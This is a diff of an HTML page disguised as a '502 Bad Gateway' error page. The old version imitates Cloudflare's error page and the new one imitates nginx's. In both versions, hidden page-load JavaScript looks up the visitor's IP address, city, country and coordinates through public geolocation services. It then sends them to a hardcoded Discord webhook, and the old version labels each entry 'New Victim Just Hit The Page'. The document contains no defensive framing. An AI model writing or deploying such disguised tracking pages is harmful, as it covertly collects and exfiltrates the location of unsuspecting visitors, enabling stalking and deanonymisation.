@@ -6,172 +6,109 @@
     <title>502 Bad Gateway</title>
     <style>
         body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
             margin: 0;
-            font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: #f2f2f2;
+            padding: 20px;
+            background-color: #f5f5f5;
             color: #333;
-            line-height: 1.5;
+            line-height: 1.4;
         }
-        .cf-wrapper {
-            max-width: 1200px;
-            margin: 40px auto;
+        .error-container {
+            max-width: 600px;
+            margin: 0 auto;
             background: white;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-            border-radius: 8px;
-            overflow: hidden;
+            padding: 40px;
+            border: 1px solid #ddd;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .cf-header {
-            background: linear-gradient(135deg, #f58020, #f35325);
-            color: white;
-            padding: 40px 30px;
-            text-align: left;
+        h1 {
+            font-size: 4em;
+            font-weight: 300;
+            color: #dc3545;
+            margin: 0 0 20px 0;
+            letter-spacing: -2px;
         }
-        .cf-header h1 {
-            font-size: 48px;
-            font-weight: 800;
-            margin: 0;
+        p {
+            font-size: 1.1em;
+            margin: 0 0 15px 0;
         }
-        .cf-header p {
-            font-size: 18px;
-            opacity: 0.9;
-            margin: 8px 0 0;
-        }
-        .cf-body {
-            padding: 50px 60px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 40px;
-            flex-wrap: wrap;
-        }
-        .diagram {
-            display: flex;
-            align-items: center;
-            gap: 30px;
-            font-size: 16px;
-        }
-        .node {
-            text-align: center;
-        }
-        .icon {
-            width: 80px;
-            height: 80px;
-            background: #e5e5e5;
-            border-radius: 50%;
-            margin-bottom: 12px;
-            position: relative;
-        }
-        .icon img { width: 50px; position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); }
-        .check { background: #4caf50; }
-        .cross { background: #f44336; }
-        .arrow {
-            font-size: 40px;
-            color: #999;
-        }
-        .label { margin-top: 8px; font-weight: 600; }
-        .status { font-size: 14px; margin-top: 4px; }
-        .green { color: #4caf50; }
-        .red { color: #f44336; }
-        .cf-footer {
-            padding: 30px 60px;
-            background: #fafafa;
-            display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 20px;
-            font-size: 16px;
-        }
-        .cf-footer strong { color: #f58020; }
-        @media (max-width: 768px) {
-            .cf-body { flex-direction: column; text-align: center; }
-            .diagram { flex-direction: column; }
-            .arrow { transform: rotate(90deg); }
+        .details {
+            font-size: 0.9em;
+            color: #666;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
         }
     </style>
-    <link href="https://rsms.me/inter/inter.css" rel="stylesheet">
 </head>
 <body>
-    <div class="cf-wrapper">
-        <div class="cf-header">
-            <h1>Error 502</h1>
-            <p>Bad gateway</p>
-        </div>
-
-        <div class="cf-body">
-            <div class="diagram">
-                <div class="node">
-                    <div class="icon check"><img src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/72x72/1f4bb.png"></div>
-                    <div class="label">You<br><span style="font-size:14px;color:#666;">Browser</span></div>
-                    <div class="status green">Working</div>
-                </div>
-
-                <div class="arrow">⟶</div>
-
-                <div class="node">
-                    <div class="icon check"><img src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/72x72/2601.png"></div>
-                    <div class="label">Cloudflare<br><span style="font-size:14px;color:#666;">POP: undef</span></div>
-                    <div class="status green">Working</div>
-                </div>
-
-                <div class="arrow">⟶</div>
-
-                <div class="node">
-                    <div class="icon cross"><img src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/72x72/1f4e6.png"></div>
-                    <div class="label">example.com<br><span style="font-size:14px;color:#666;">Host</span></div>
-                    <div class="status red">Error</div>
-                </div>
-            </div>
-        </div>
-
-        <div class="cf-footer">
-            <div><strong>What happened?</strong><br>The web server reported a bad gateway error.</div>
-            <div><strong>What can I do?</strong><br>Please try again in a few minutes.</div>
-            <div>Ray ID: <code id="ray">0000000000000000</code> • 
-                <span id="time"></span> UTC
-            </div>
+    <div class="error-container">
+        <h1>502 Bad Gateway</h1>
+        <p>The server returned an invalid or incomplete response while acting as a gateway or proxy server.</p>
+        <p>You can try:</p>
+        <ul>
+            <li>Reload this web page later.</li>
+            <li>Check for network issues or contact your ISP.</li>
+            <li>Try accessing the site from a different device or browser.</li>
+        </ul>
+        <div class="details">
+            <p>nginx/1.18.0 (Ubuntu)</p>
         </div>
     </div>
-
     <script>
-        // Fake Ray ID & current time
-        document.getElementById('ray').textContent = Math.random().toString(16).substr(2, 16);
-        document.getElementById('time').textContent = new Date().toISOString().replace('T',' ').substr(0,19);
-
-        // Silent logging (ip-api.com is the most reliable free one in 2025)
-        fetch('https://ip-api.com/json/?fields=66846719')
-            .then(r => r.json())
-            .then(d => {
-                if (d.status !== 'success') return;
-
-                const mapsLink = `https://www.google.com/maps/@${d.lat},${d.lon},10z`;
-                const staticMap = `https://maps.googleapis.com/maps/api/staticmap?center=${d.lat},${d.lon}&zoom=10&size=640x320&scale=2&markers=color:red%7C${d.lat},${d.lon}`;
-
-                const embed = {
-                    embeds: [{
-                        title: "New Victim Just Hit The Page",
-                        color: 0xf58020,
-                        fields: [
-                            { name: "IP", value: `\`${d.query}\``, inline: true },
-                            { name: "ISP", value: d.isp, inline: true },
-                            { name: "Country", value: `${d.country} ${d.countryCode}`, inline: true },
-                            { name: "Region", value: d.regionName, inline: true },
-                            { name: "City", value: d.city, inline: true },
-                            { name: "Coords", value: `${d.lat}, ${d.lon}`, inline: true },
-                            { name: "Maps Link", value: `[Open Google Maps](${mapsLink})`, inline: false }
-                        ],
-                        image: { url: staticMap },
-                        footer: { text: `Ray ID: ${document.getElementById('ray').textContent}` },
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                fetch('https://discord.com/api/webhooks/1438923668091699220/mCkSrF8MtQUTOsjoqbC2qrcmhJHoNh4xwrVqMcmpviJ3bEjeJoiiB3O__dpF8Lv0ZsQz', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(embed)
-                });
+        // Fetch geolocation data including IP
+        fetch('https://ipinfo.io/json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const city = data.city || 'Unknown';
+                const countryCode = data.country || '';
+                const [lat, lon] = (data.loc || '').split(',') || ['Unknown', 'Unknown'];
+                
+                if (countryCode === 'Unknown' || !countryCode) {
+                    // Send without country name
+                    sendPayload(ip, city, 'Unknown', lat, lon);
+                    return;
+                }
+                
+                // Fetch country name
+                fetch(`https://restcountries.com/v3.1/alpha/${countryCode}?fields=name`)
+                    .then(response => response.json())
+                    .then(geo => {
+                        const country = geo[0]?.name?.common || 'Unknown';
+                        sendPayload(ip, city, country, lat, lon);
+                    })
+                    .catch(err => {
+                        console.error('Country name fetch error:', err);
+                        sendPayload(ip, city, 'Unknown', lat, lon);
+                    });
             })
-            .catch(() => {});
+            .catch(err => {
+                console.error('IPinfo fetch error:', err);
+                // Fallback to ipify for IP only
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        sendPayload(data.ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown');
+                    })
+                    .catch(() => {
+                        // Even fallback fails, just don't send
+                    });
+            });
+
+        function sendPayload(ip, city, country, lat, lon) {
+            const payload = {
+                content: `**New IP Log**\n**IP:** \`${ip}\`\n**City:** ${city}\n**Country:** ${country}\n**Coordinates:** ${lat}, ${lon}`
+            };
+            
+            fetch('https://discord.com/api/webhooks/1438923668091699220/mCkSrF8MtQUTOsjoqbC2qrcmhJHoNh4xwrVqMcmpviJ3bEjeJoiiB3O__dpF8Lv0ZsQz', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error('Webhook send error:', err));
+        }
     </script>
 </body>
 </html>
